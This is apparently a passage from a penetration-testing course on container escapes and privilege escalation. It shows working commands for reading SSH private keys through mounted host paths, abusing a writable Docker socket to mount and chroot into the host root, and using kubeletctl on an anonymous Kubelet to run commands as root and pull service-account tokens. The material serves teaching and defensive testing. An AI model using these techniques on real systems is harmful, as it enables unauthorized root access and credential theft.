<p>When we get access to the docker container and enumerate it locally, we might find additional (non-standard) directories on the docker’s filesystem.</p>
<p>Docker</p>
<pre><code class="lang-shell-session">root@container<span class="hljs-symbol">:~</span>$ cd /hostsystem/home/cry0l1t3
root@container<span class="hljs-symbol">:/hostsystem/home/cry0l1t3</span>$ ls -l

-rw-------  <span class="hljs-number">1</span> cry0l1t3 cry0l1t3  <span class="hljs-number">12559</span> Jun <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span>09 .bash_history
-rw-r--r--  <span class="hljs-number">1</span> cry0l1t3 cry0l1t3    <span class="hljs-number">220</span> Jun <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span>09 .bash_logout
-rw-r--r--  <span class="hljs-number">1</span> cry0l1t3 cry0l1t3   <span class="hljs-number">3771</span> Jun <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span>09 .bashrc
drwxr-x--- <span class="hljs-number">10</span> cry0l1t3 cry0l1t3   <span class="hljs-number">4096</span> Jun <span class="hljs-number">30</span> <span class="hljs-number">15</span><span class="hljs-symbol">:</span>09 .ssh


root@container<span class="hljs-symbol">:/hostsystem/home/cry0l1t3</span>$ cat .ssh/id_rsa

-----<span class="hljs-keyword">BEGIN</span> RSA PRIVATE KEY-----
&lt;SNIP&gt;
</code></pre>
<p>From here on, we could copy the contents of the private SSH key to <code>cry0l1t3.priv</code> file and use it to log in as the user <code>cry0l1t3</code> on the host system.</p>
<p>Docker</p>
<pre><code class="lang-shell-session"><span class="hljs-selector-tag">root</span>@<span class="hljs-keyword">htb</span>[/<span class="hljs-keyword">htb</span>]$ ssh cry0l1t3@&lt;host IP&gt; -i cry0l1t3.priv
</code></pre>
<p><strong>Docker Sockets</strong></p>
<p>A Docker socket or Docker daemon socket is a special file that allows us and processes to communicate with the Docker daemon. This communication occurs either through a Unix socket or a network socket, depending on the configuration of our Docker setup. It acts as a bridge, facilitating communication between the Docker client and the Docker daemon. When we issue a command through the Docker CLI, the Docker client sends the command to the Docker socket, and the Docker daemon, in turn, processes the command and carries out the requested actions.</p>
<p>Nevertheless, Docker sockets require appropriate permissions to ensure secure communication and prevent unauthorized access. Access to the Docker socket is typically restricted to specific users or user groups, ensuring that only trusted individuals can issue commands and interact with the Docker daemon. By exposing the Docker socket over a network interface, we can remotely manage Docker hosts, issue commands, and control containers and other resources. This remote API access expands the possibilities for distributed Docker setups and remote management scenarios. However, depending on the configuration, there are many ways where automated processes or tasks can be stored. Those files can contain very useful information for us that we can use to escape the Docker container.</p>
<p>Docker</p>
<pre><code class="lang-shell-session">htb-student@container:~/app$ ls -al

total 8
drwxr-xr-x<span class="hljs-number"> 1 </span>htb-student htb-student<span class="hljs-number"> 4096 </span>Jun<span class="hljs-number"> 30 </span>15:12 .
drwxr-xr-x<span class="hljs-number"> 1 </span>root        root       <span class="hljs-number"> 4096 </span>Jun<span class="hljs-number"> 30 </span>15:12 ..
srw-rw----<span class="hljs-number"> 1 </span>root        root          <span class="hljs-number"> 0 </span>Jun<span class="hljs-number"> 30 </span>15:27 docker.sock
</code></pre>
<p>From here on, we can use the <code>docker</code> to interact with the socket and enumerate what docker containers are already running. If not installed, then we can download it <a href="https://master.dockerproject.org/linux/x86\_64/docker">here</a> and upload it to the Docker container.</p>
<p>Docker</p>
<pre><code class="lang-shell-session">htb-student<span class="hljs-meta">@container</span>:<span class="hljs-regexp">/tmp$ wget https:/</span><span class="hljs-regexp">/&lt;parrot-os&gt;:443/</span>docker -O docker
htb-student<span class="hljs-meta">@container</span>:/tmp$ chmod +x docker
htb-student<span class="hljs-meta">@container</span>:/tmp$ ls -l

-rwxr-xr-x <span class="hljs-number">1</span> htb-student htb-student <span class="hljs-number">0</span> Jun <span class="hljs-number">30</span> <span class="hljs-number">15</span>:<span class="hljs-number">27</span> docker


htb-student<span class="hljs-meta">@container</span>:<span class="hljs-regexp">~/tmp$ /</span>tmp<span class="hljs-regexp">/docker -H unix:/</span><span class="hljs-comment">//app/docker.sock ps</span>

CONTAINER ID     IMAGE         COMMAND                 CREATED       STATUS           PORTS     NAMES
<span class="hljs-number">3</span>fe8a4782311     main_app      <span class="hljs-string">"/docker-entry.s..."</span>    <span class="hljs-number">3</span> days ago    Up <span class="hljs-number">12</span> minutes    <span class="hljs-number">443</span>/tcp   app
&lt;SNIP&gt;
</code></pre>
<p>We can create our own Docker container that maps the host’s root directory (<code>/</code>) to the <code>/hostsystem</code> directory on the container. With this, we will get full access to the host system. Therefore, we must map these directories accordingly and use the <code>main_app</code> Docker image.</p>
<p>Docker</p>
<pre><code class="lang-shell-session">htb-student<span class="hljs-meta">@container</span>:<span class="hljs-regexp">/app$ /</span>tmp<span class="hljs-regexp">/docker -H unix:/</span><span class="hljs-comment">//app/docker.sock run --rm -d --privileged -v /:/hostsystem main_app</span>
htb-student<span class="hljs-meta">@container</span>:<span class="hljs-regexp">~/app$ /</span>tmp<span class="hljs-regexp">/docker -H unix:/</span><span class="hljs-comment">//app/docker.sock ps</span>

CONTAINER ID     IMAGE         COMMAND                 CREATED           STATUS           PORTS     NAMES
<span class="hljs-number">7</span>ae3bcc818af     main_app      <span class="hljs-string">"/docker-entry.s..."</span>    <span class="hljs-number">12</span> seconds ago    Up <span class="hljs-number">8</span> seconds     <span class="hljs-number">443</span>/tcp   app
<span class="hljs-number">3</span>fe8a4782311     main_app      <span class="hljs-string">"/docker-entry.s..."</span>    <span class="hljs-number">3</span> days ago        Up <span class="hljs-number">17</span> minutes    <span class="hljs-number">443</span>/tcp   app
&lt;SNIP&gt;
</code></pre>
<p>Now, we can log in to the new privileged Docker container with the ID <code>7ae3bcc818af</code> and navigate to the <code>/hostsystem</code>.</p>
<p>Docker</p>
<pre><code class="lang-shell-session">htb-student@container:<span class="hljs-regexp">/app$ /</span>tmp<span class="hljs-regexp">/docker -H unix:/</span><span class="hljs-comment">//app/docker.sock exec -it 7ae3bcc818af /bin/bash</span>


root@<span class="hljs-number">7</span>ae3bcc818af:~# cat <span class="hljs-regexp">/hostsystem/</span>root<span class="hljs-regexp">/.ssh/i</span>d_rsa

-----BEGIN RSA <span class="hljs-keyword">PRIVATE</span> KEY-----
&lt;SNIP&gt;
</code></pre>
<p>From there, we can again try to grab the private SSH key and log in as root or as any other user on the system with a private SSH key in its folder.</p>
<p><strong>Docker Group</strong></p>
<p>To gain root privileges through Docker, the user we are logged in with must be in the <code>docker</code> group. This allows him to use and control the Docker daemon.</p>
<p>Docker</p>
<pre><code class="lang-shell-session">docker-user@<span class="hljs-symbol">nix02</span>:~$ id

uid=<span class="hljs-number">1000</span><span class="hljs-comment">(docker-user)</span> gid=<span class="hljs-number">1000</span><span class="hljs-comment">(docker-user)</span> groups=<span class="hljs-number">1000</span><span class="hljs-comment">(docker-user)</span>,<span class="hljs-number">116</span><span class="hljs-comment">(docker)</span>
</code></pre>
<p>Alternatively, Docker may have SUID set, or we are in the Sudoers file, which permits us to run <code>docker</code> as root. All three options allow us to work with Docker to escalate our privileges.</p>
<p>Most hosts have a direct internet connection because the base images and containers must be downloaded. However, many hosts may be disconnected from the internet at night and outside working hours for security reasons. However, if these hosts are located in a network where, for example, a web server has to pass through, it can still be reached.</p>
<p>To see which images exist and which we can access, we can use the following command:</p>
<p>Docker</p>
<pre><code class="lang-shell-session">docker-user@nix02:~$ docker image ls

REPOSITORY                           <span class="hljs-keyword">TAG</span>                 <span class="hljs-title">IMAGE</span> ID       CREATED         SIZE
ubuntu                               <span class="hljs-number">20.04</span>               <span class="hljs-number">20</span>fffa419e3a   <span class="hljs-number">2</span> days ago    <span class="hljs-number">72.8M</span>B
</code></pre>
<p><strong>Docker Socket</strong></p>
<p>A case that can also occur is when the Docker socket is writable. Usually, this socket is located in <code>/var/run/docker.sock</code>. However, the location can understandably be different. Because basically, this can only be written by the root or docker group. If we act as a user, not in one of these two groups, and the Docker socket still has the privileges to be writable, then we can still use this case to escalate our privileges.</p>
<p>Docker</p>
<pre><code class="lang-shell-session">docker-user@nix02:~$ docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash

root@ubuntu:~<span class="hljs-comment"># ls -l</span>

total 68
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 7 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>bin -&gt; usr/bin
drwxr-xr-x  <span class="hljs-number"> 4 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>11:34 boot
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 6 </span><span class="hljs-number"> 2021 </span>cdrom
drwxr-xr-x <span class="hljs-number"> 19 </span>root root <span class="hljs-number"> 3940 </span>Oct<span class="hljs-number"> 24 </span>13:28 dev
drwxr-xr-x<span class="hljs-number"> 100 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>13:27 etc
drwxr-xr-x  <span class="hljs-number"> 3 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>11:06 home
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 7 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>lib -&gt; usr/lib
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 9 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>lib32 -&gt; usr/lib32
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 9 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>lib64 -&gt; usr/lib64
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root   <span class="hljs-number"> 10 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>libx32 -&gt; usr/libx32
drwx------  <span class="hljs-number"> 2 </span>root root<span class="hljs-number"> 16384 </span>Oct <span class="hljs-number"> 6 </span><span class="hljs-number"> 2021 </span>lost+found
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 24 </span>13:28 media
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>mnt
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>opt
dr-xr-xr-x<span class="hljs-number"> 307 </span>root root    <span class="hljs-number"> 0 </span>Oct<span class="hljs-number"> 24 </span>13:28 proc
drwx------  <span class="hljs-number"> 6 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 26 </span>21:11 root
drwxr-xr-x <span class="hljs-number"> 28 </span>root root  <span class="hljs-number"> 920 </span>Oct<span class="hljs-number"> 24 </span>13:32 run
lrwxrwxrwx  <span class="hljs-number"> 1 </span>root root    <span class="hljs-number"> 8 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>sbin -&gt; usr/sbin
drwxr-xr-x  <span class="hljs-number"> 7 </span>root root <span class="hljs-number"> 4096 </span>Oct <span class="hljs-number"> 7 </span><span class="hljs-number"> 2021 </span>snap
drwxr-xr-x  <span class="hljs-number"> 2 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>srv
dr-xr-xr-x <span class="hljs-number"> 13 </span>root root    <span class="hljs-number"> 0 </span>Oct<span class="hljs-number"> 24 </span>13:28 sys
drwxrwxrwt <span class="hljs-number"> 13 </span>root root <span class="hljs-number"> 4096 </span>Oct<span class="hljs-number"> 24 </span>13:44 tmp
drwxr-xr-x <span class="hljs-number"> 14 </span>root root <span class="hljs-number"> 4096 </span>Sep<span class="hljs-number"> 22 </span>11:11 usr
drwxr-xr-x <span class="hljs-number"> 13 </span>root root <span class="hljs-number"> 4096 </span>Apr<span class="hljs-number"> 23 </span><span class="hljs-number"> 2020 </span>var
</code></pre>
<h2 id="kubernetes">Kubernetes</h2>
<hr>
<p><a href="https://kubernetes.io/">Kubernetes</a>, also known as <code>K8s</code>, stands out as a revolutionary technology that has had a significant impact on the software development landscape. This platform has completely transformed the process of deploying and managing applications, providing a more efficient and streamlined approach. Offering an open-source architecture, Kubernetes has been specifically designed to facilitate faster and more straightforward deployment, scaling, and management of application containers.</p>
<p>Developed by Google, Kubernetes leverages over a decade of experience in running complex workloads. As a result, it has become a critical tool in the DevOps universe for microservices orchestration. Since its creation, Kubernetes has been donated to the <a href="https://www.cncf.io/">Cloud Native Computing Foundation</a>, where it has become the industry&#39;s gold standard. Understanding the security aspects of K8 containers is crucial. We will probably be able to access one of the many containers during our penetration test.</p>
<p>One of the key features of Kubernetes is its adaptability and compatibility with various environments. This platform offers an extensive range of features that enable developers and system administrators to easily configure, automate, and scale their deployments and applications. As a result, Kubernetes has become a go-to solution for organizations looking to streamline their development processes and improve efficiency.</p>
<p>Kubernetes is a container orchestration system, which functions by running all applications in containers isolated from the host system through <code>multiple layers of protection</code>. This approach ensures that applications are not affected by changes in the host system, such as updates or security patches. The K8s architecture comprises a <code>master node</code> and <code>worker nodes</code>, each with specific roles.</p>
<hr>
<h3 id="k8s-concept">K8s Concept</h3>
<p>Kubernetes revolves around the concept of pods, which can hold one or more closely connected containers. Each pod functions as a separate virtual machine on a node, complete with its own IP, hostname, and other details. Kubernetes simplifies the management of multiple containers by offering tools for load balancing, service discovery, storage orchestration, self-healing, and more. Despite challenges in security and management, K8s continues to grow and improve with features like <code>Role-Based Access Control</code> (<code>RBAC</code>), <code>Network Policies</code>, and <code>Security Contexts</code>, providing a safer environment for applications.</p>
<p>Differences between K8 and Docker</p>
<table>
<thead>
<tr>
<th><strong>Function</strong></th>
<th><strong>Docker</strong></th>
<th><strong>Kubernetes</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>Primary</code></td>
<td>Platform for containerizing Apps</td>
<td>An orchestration tool for managing containers</td>
</tr>
<tr>
<td><code>Scaling</code></td>
<td>Manual scaling with Docker swarm</td>
<td>Automatic scaling</td>
</tr>
<tr>
<td><code>Networking</code></td>
<td>Single network</td>
<td>Complex network with policies</td>
</tr>
<tr>
<td><code>Storage</code></td>
<td>Volumes</td>
<td>Wide range of storage options</td>
</tr>
</tbody>
</table>
<p>Kubernetes architecture is primarily divided into two types of components:</p>
<ul>
<li><code>The Control Plane</code> (master node), which is responsible for controlling the Kubernetes cluster</li>
<li><code>The Worker Nodes</code> (minions), where the containerized applications are run</li>
</ul>
<p><strong>Nodes</strong></p>
<p>The master node hosts the Kubernetes <code>Control Plane</code>, which manages and coordinates all activities within the cluster and it also ensures that the cluster&#39;s desired state is maintained. On the other hand, the <code>Minions</code> execute the actual applications and they receive instructions from the Control Plane and ensure the desired state is achieved.</p>
<p>It covers versatility in accommodating various needs, such as supporting databases, AI/ML workloads, and cloud-native microservices. Additionally, it&#39;s capable of managing high-resource applications at the edge and is compatible with different platforms. Therefore, it can be utilized on public cloud services like Google Cloud, Azure, and AWS or within private on-premises data centers.</p>
<p><strong>Control Plane</strong></p>
<p>The Control Plane serves as the management layer. It consists of several crucial components, including:</p>
<table>
<thead>
<tr>
<th><strong>Service</strong></th>
<th><strong>TCP Ports</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>etcd</code></td>
<td><code>2379</code>, <code>2380</code></td>
</tr>
<tr>
<td><code>API server</code></td>
<td><code>6443</code></td>
</tr>
<tr>
<td><code>Scheduler</code></td>
<td><code>10251</code></td>
</tr>
<tr>
<td><code>Controller Manager</code></td>
<td><code>10252</code></td>
</tr>
<tr>
<td><code>Kubelet API</code></td>
<td><code>10250</code></td>
</tr>
<tr>
<td><code>Read-Only Kubelet API</code></td>
<td><code>10255</code></td>
</tr>
</tbody>
</table>
<p>These elements enable the <code>Control Plane</code> to make decisions and provide a comprehensive view of the entire cluster.</p>
<p><strong>Minions</strong></p>
<p>Within a containerized environment, the <code>Minions</code> (worker nodes) serve as the designated location for running applications. It&#39;s important to note that each node is managed and regulated by the Control Plane, which helps ensure that all processes running within the containers operate smoothly and efficiently.</p>
<p>The <code>Scheduler</code>, based on the <code>API server</code>, understands the state of the cluster and schedules new pods on the nodes accordingly. After deciding which node a pod should run on, the API server updates the <code>etcd</code>.</p>
<p>Understanding how these components interact is essential for grasping the functioning of Kubernetes. The API server is the entry point for all the administrative commands, either from users via kubectl or from the controllers. This server communicates with etcd to fetch or update the cluster state.</p>
<p><strong>K8&#39;s Security Measures</strong></p>
<p>Kubernetes security can be divided into several domains:</p>
<ul>
<li>Cluster infrastructure security</li>
<li>Cluster configuration security</li>
<li>Application security</li>
<li>Data security</li>
</ul>
<p>Each domain includes multiple layers and elements that must be secured and managed appropriately by the developers and administrators.</p>
<hr>
<h3 id="kubernetes-api">Kubernetes API</h3>
<p>The core of Kubernetes architecture is its API, which serves as the main point of contact for all internal and external interactions. The Kubernetes API has been designed to support declarative control, allowing users to define their desired state for the system. This enables Kubernetes to take the necessary steps to implement the desired state. The kube-apiserver is responsible for hosting the API, which handles and verifies RESTful requests for modifying the system&#39;s state. These requests can involve creating, modifying, deleting, and retrieving information related to various resources within the system. Overall, the Kubernetes API plays a crucial role in facilitating seamless communication and control within the Kubernetes cluster.</p>
<p>Within the Kubernetes framework, an API resource serves as an endpoint that houses a specific collection of API objects. These objects pertain to a particular category and include essential elements such as Pods, Services, and Deployments, among others. Each unique resource comes equipped with a distinct set of operations that can be executed, including but not limited to:</p>
<table>
<thead>
<tr>
<th><strong>Request</strong></th>
<th><strong>Description</strong></th>
</tr>
</thead>
<tbody>
<tr>
<td><code>GET</code></td>
<td>Retrieves information about a resource or a list of resources.</td>
</tr>
<tr>
<td><code>POST</code></td>
<td>Creates a new resource.</td>
</tr>
<tr>
<td><code>PUT</code></td>
<td>Updates an existing resource.</td>
</tr>
<tr>
<td><code>PATCH</code></td>
<td>Applies partial updates to a resource.</td>
</tr>
<tr>
<td><code>DELETE</code></td>
<td>Removes a resource.</td>
</tr>
</tbody>
</table>
<p><strong>Authentication</strong></p>
<p>In terms of authentication, Kubernetes supports various methods such as client certificates, bearer tokens, an authenticating proxy, or HTTP basic auth, which serve to verify the user&#39;s identity. Once the user has been authenticated, Kubernetes enforces authorization decisions using Role-Based Access Control (<code>RBAC</code>). This technique involves assigning specific roles to users or processes with corresponding permissions to access and operate on resources. Therefore, Kubernetes&#39; authentication and authorization process is a comprehensive security measure that ensures only authorized users can access resources and perform operations.</p>
<p>In Kubernetes, the <code>Kubelet</code> can be configured to permit <code>anonymous access</code>. By default, the Kubelet allows anonymous access. Anonymous requests are considered unauthenticated, which implies that any request made to the Kubelet without a valid client certificate will be treated as anonymous. This can be problematic as any process or user that can reach the Kubelet API can make requests and receive responses, potentially exposing sensitive information or leading to unauthorized actions.</p>
<p><strong>K8&#39;s API Server Interaction</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3@k8:~$ curl https://<span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span>:<span class="hljs-number">6443</span> -k

{
    <span class="hljs-string">"kind"</span>: <span class="hljs-string">"Status"</span>,
    <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
    <span class="hljs-string">"metadata"</span>: {},
    <span class="hljs-string">"status"</span>: <span class="hljs-string">"Failure"</span>,
    <span class="hljs-string">"message"</span>: <span class="hljs-string">"forbidden: User \"</span>system:anonymous\<span class="hljs-string">" cannot get path \"</span>/\<span class="hljs-string">""</span>,
    <span class="hljs-string">"reason"</span>: <span class="hljs-string">"Forbidden"</span>,
    <span class="hljs-string">"details"</span>: {},
    <span class="hljs-string">"code"</span>: <span class="hljs-number">403</span>
}
</code></pre>
<p><code>System:anonymous</code> typically represents an unauthenticated user, meaning we haven&#39;t provided valid credentials or are trying to access the API server anonymously. In this case, we try to access the root path, which would grant significant control over the Kubernetes cluster if successful. By default, access to the root path is generally restricted to authenticated and authorized users with administrative privileges and the API server denied the request, responding with a <code>403 Forbidden</code> status code accordingly.</p>
<p><strong>Kubelet API - Extracting Pods</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3@k8:~$ curl https://<span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span>:<span class="hljs-number">10250</span>/pods -k | jq .

...SNIP...
{
  <span class="hljs-string">"kind"</span>: <span class="hljs-string">"PodList"</span>,
  <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
  <span class="hljs-string">"metadata"</span>: {},
  <span class="hljs-string">"items"</span>: [
    {
      <span class="hljs-string">"metadata"</span>: {
        <span class="hljs-string">"name"</span>: <span class="hljs-string">"nginx"</span>,
        <span class="hljs-string">"namespace"</span>: <span class="hljs-string">"default"</span>,
        <span class="hljs-string">"uid"</span>: <span class="hljs-string">"aadedfce-4243-47c6-ad5c-faa5d7e00c0c"</span>,
        <span class="hljs-string">"resourceVersion"</span>: <span class="hljs-string">"491"</span>,
        <span class="hljs-string">"creationTimestamp"</span>: <span class="hljs-string">"2023-07-04T10:42:02Z"</span>,
        <span class="hljs-string">"annotations"</span>: {
          <span class="hljs-string">"kubectl.kubernetes.io/last-applied-configuration"</span>: <span class="hljs-string">"{\"</span>apiVersion\<span class="hljs-string">":\"</span>v1\<span class="hljs-string">",\"</span>kind\<span class="hljs-string">":\"</span>Pod\<span class="hljs-string">",\"</span>metadata\<span class="hljs-string">":{\"</span>annotations\<span class="hljs-string">":{},\"</span>name\<span class="hljs-string">":\"</span>nginx\<span class="hljs-string">",\"</span>namespace\<span class="hljs-string">":\"</span>default\<span class="hljs-string">"},\"</span>spec\<span class="hljs-string">":{\"</span>containers\<span class="hljs-string">":[{\"</span>image\<span class="hljs-string">":\"</span>nginx:<span class="hljs-number">1.14</span>.<span class="hljs-number">2</span>\<span class="hljs-string">",\"</span>imagePullPolicy\<span class="hljs-string">":\"</span>Never\<span class="hljs-string">",\"</span>name\<span class="hljs-string">":\"</span>nginx\<span class="hljs-string">",\"</span>ports\<span class="hljs-string">":[{\"</span>containerPort\<span class="hljs-string">":80}]}]}}\n"</span>,
          <span class="hljs-string">"kubernetes.io/config.seen"</span>: <span class="hljs-string">"2023-07-04T06:42:02.263953266-04:00"</span>,
          <span class="hljs-string">"kubernetes.io/config.source"</span>: <span class="hljs-string">"api"</span>
        },
        <span class="hljs-string">"managedFields"</span>: [
          {
            <span class="hljs-string">"manager"</span>: <span class="hljs-string">"kubectl-client-side-apply"</span>,
            <span class="hljs-string">"operation"</span>: <span class="hljs-string">"Update"</span>,
            <span class="hljs-string">"apiVersion"</span>: <span class="hljs-string">"v1"</span>,
            <span class="hljs-string">"time"</span>: <span class="hljs-string">"2023-07-04T10:42:02Z"</span>,
            <span class="hljs-string">"fieldsType"</span>: <span class="hljs-string">"FieldsV1"</span>,
            <span class="hljs-string">"fieldsV1"</span>: {
              <span class="hljs-string">"f:metadata"</span>: {
                <span class="hljs-string">"f:annotations"</span>: {
                  <span class="hljs-string">"."</span>: {},
                  <span class="hljs-string">"f:kubectl.kubernetes.io/last-applied-configuration"</span>: {}
                }
              },
              <span class="hljs-string">"f:spec"</span>: {
                <span class="hljs-string">"f:containers"</span>: {
                  <span class="hljs-string">"k:{\"</span>name\<span class="hljs-string">":\"</span>nginx\<span class="hljs-string">"}"</span>: {
                    <span class="hljs-string">"."</span>: {},
                    <span class="hljs-string">"f:image"</span>: {},
                    <span class="hljs-string">"f:imagePullPolicy"</span>: {},
                    <span class="hljs-string">"f:name"</span>: {},
                    <span class="hljs-string">"f:ports"</span>: {
                    ...SNIP...
</code></pre>
<p>The information displayed in the output includes the <code>names</code>, <code>namespaces</code>, <code>creation timestamps</code>, and <code>container images</code> of the pods. It also shows the <code>last applied configuration</code> for each pod, which could contain confidential details regarding the container images and their pull policies.</p>
<p>Understanding the container images and their versions used in the cluster can enable us to identify known vulnerabilities and exploit them to gain unauthorized access to the system. Namespace information can provide insights into how the pods and resources are arranged within the cluster, which we can use to target specific namespaces with known vulnerabilities. We can also use metadata such as <code>uid</code> and <code>resourceVersion</code> to perform reconnaissance and recognize potential targets for further attacks. Disclosing the last applied configuration can potentially expose sensitive information, such as passwords, secrets, or API tokens, used during the deployment of the pods.</p>
<p>We can further analyze the pods with the following command:</p>
<p><strong>Kubeletctl - Extracting Pods</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3@k8:~$ kubeletctl -i <span class="hljs-comment">--server 10.129.10.11 pods</span>

┌────────────────────────────────────────────────────────────────────────────────┐
│                                Pods <span class="hljs-built_in">from</span> Kubelet                               │
├───┬────────────────────────────────────┬─────────────┬─────────────────────────┤
│   │ POD                                │ NAMESPACE   │ CONTAINERS              │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ <span class="hljs-number">1</span> │ coredns<span class="hljs-number">-78</span>fcd69978-zbwf9           │ kube-<span class="hljs-keyword">system</span> │ coredns                 │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ <span class="hljs-number">2</span> │ nginx                              │ default     │ nginx                   │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
│ <span class="hljs-number">3</span> │ etcd-steamcloud                    │ kube-<span class="hljs-keyword">system</span> │ etcd                    │
│   │                                    │             │                         │
├───┼────────────────────────────────────┼─────────────┼─────────────────────────┤
</code></pre>
<p>To effectively interact with pods within the Kubernetes environment, it&#39;s important to have a clear understanding of the available commands. One approach that can be particularly useful is utilizing the <code>scan rce</code> command in <code>kubeletctl</code>. This command provides valuable insights and allows for efficient management of pods.</p>
<p><strong>Kubelet API - Available Commands</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3@k8:~$ kubeletctl -i --server <span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span> scan rce

┌─────────────────────────────────────────────────────────────────────────────────────────────────────┐
│                                   <span class="hljs-keyword">Node</span> <span class="hljs-title">with</span> pods vulnerable to RCE                                  │
├───┬──────────────┬────────────────────────────────────┬─────────────┬─────────────────────────┬─────┤
│   │ <span class="hljs-keyword">NODE</span> <span class="hljs-title">IP</span>      │ PODS                               │ NAMESPACE   │ CONTAINERS              │ RCE │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│   │              │                                    │             │                         │ RUN │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ <span class="hljs-number">1</span> │ <span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span> │ nginx                              │ default     │ nginx                   │ +   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
│ <span class="hljs-number">2</span> │              │ etcd-steamcloud                    │ kube-system │ etcd                    │ -   │
├───┼──────────────┼────────────────────────────────────┼─────────────┼─────────────────────────┼─────┤
</code></pre>
<p>It is also possible for us to engage with a container interactively and gain insight into the extent of our privileges within it. This allows us to better understand our level of access and control over the container&#39;s contents.</p>
<p><strong>Kubelet API - Executing Commands</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3@k8:~$ kubeletctl -<span class="hljs-selector-tag">i</span> --server <span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span> exec <span class="hljs-string">"id"</span> -<span class="hljs-selector-tag">p</span> nginx -c nginx

uid=<span class="hljs-number">0</span>(root) gid=<span class="hljs-number">0</span>(root) groups=<span class="hljs-number">0</span>(root)
</code></pre>
<p>The output of the command shows that the current user executing the <code>id</code> command inside the container has root privileges. This indicates that we have gained administrative access within the container, which could potentially lead to privilege escalation vulnerabilities. If we gain access to a container with root privileges, we can perform further actions on the host system or other containers.</p>
<hr>
<h3 id="privilege-escalation">Privilege Escalation</h3>
<p>To gain higher privileges and access the host system, we can utilize a tool called <a href="https://github.com/cyberark/kubeletctl">kubeletctl</a> to obtain the Kubernetes service account&#39;s <code>token</code> and <code>certificate</code> (<code>ca.crt</code>) from the server. To do this, we must provide the server&#39;s IP address, namespace, and target pod. In case we get this token and certificate, we can elevate our privileges even more, move horizontally throughout the cluster, or gain access to additional pods and resources.</p>
<p><strong>Kubelet API - Extracting Tokens</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3<span class="hljs-variable">@k8</span><span class="hljs-symbol">:~</span><span class="hljs-variable">$ </span>kubeletctl -i --server <span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span> exec <span class="hljs-string">"cat /var/run/secrets/kubernetes.io/serviceaccount/token"</span> -p nginx -c nginx | tee -a k8.token

eyJhbGciOiJSUzI1NiIsImtpZC...SNIP...UfT3OKQH6Sdw
</code></pre>
<p><strong>Kubelet API - Extracting Certificates</strong></p>
<p>Kubernetes</p>
<pre><code class="lang-shell-session">cry0l1t3@k8<span class="hljs-symbol">:~</span>$ kubeletctl --server <span class="hljs-number">10.129</span>.<span class="hljs-number">10.11</span> exec <span class="hljs-string">"cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt"</span> -p nginx -c nginx <span class="hljs-params">| tee -a ca.crt

-----<span class="hljs-keyword">BEGIN</span> CERTIFICATE-----
MIIDBjCCAe6gAwIBAgIBATANBgkqhkiG9w0BAQsFADAVMRMwEQYDVQQDEwptaW5p
&lt;SNIP&gt;
MhxgN4lKI0zpxFBTpIwJ3iZemSfh3pY2UqX03ju4TreksGMkX/hZ2NyIMrKDpolD
602eXnhZAL3+dA==
-----<span class="hljs-keyword">END</span> CERTIFICATE-----</span>
</code></pre>
